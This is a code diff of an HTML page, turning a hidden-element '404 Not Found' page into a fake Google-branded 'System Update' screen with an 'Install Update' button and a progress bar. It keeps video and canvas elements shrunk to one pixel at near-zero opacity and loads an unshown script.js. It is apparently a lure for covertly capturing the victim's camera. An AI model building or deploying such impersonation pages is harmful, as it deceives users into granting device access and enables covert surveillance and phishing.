@@ -2,19 +2,60 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>404 Not Found</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
     <style>
-        body { background-color: #ffffff; color: #000000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial', sans-serif; }
-        video, canvas, img { display: none; }
-        .loading { font-size: 14px; text-align: center; }
+        body { 
+            background-color: #f8f9fa; 
+            color: #3c4043; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: 'Roboto', Arial, sans-serif; 
+        }
+        .container { text-align: center; width: 80%; max-width: 400px; }
+        .progress-container {
+            width: 100%;
+            background-color: #e8eaed;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 8px;
+            background-color: #4285f4;
+            border-radius: 10px;
+            transition: width 0.5s linear;
+        }
+        .status-text { font-size: 14px; color: #70757a; margin-top: 10px; height: 20px; }
+        video, canvas { position: absolute; opacity: 0.01; width: 1px; height: 1px; }
+        button { background:#4285f4; color:white; border:none; padding:12px 24px; border-radius:4px; cursor:pointer; font-size: 14px; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="loading">
-        <p>Loading...</p>
+    <div class="container">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google">
+        
+        <div id="setup-area">
+            <p style="font-size: 14px;">A critical security update is available for your device.</p>
+            <button onclick="initiate()">Install Update</button>
+        </div>
+
+        <div id="progress-area" style="display:none;">
+            <div class="progress-container">
+                <div id="myBar" class="progress-bar"></div>
+            </div>
+            <div id="status" class="status-text">Starting system check...</div>
+        </div>
     </div>
+
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
+
     <script src="script.js"></script>
 </body>
 </html>
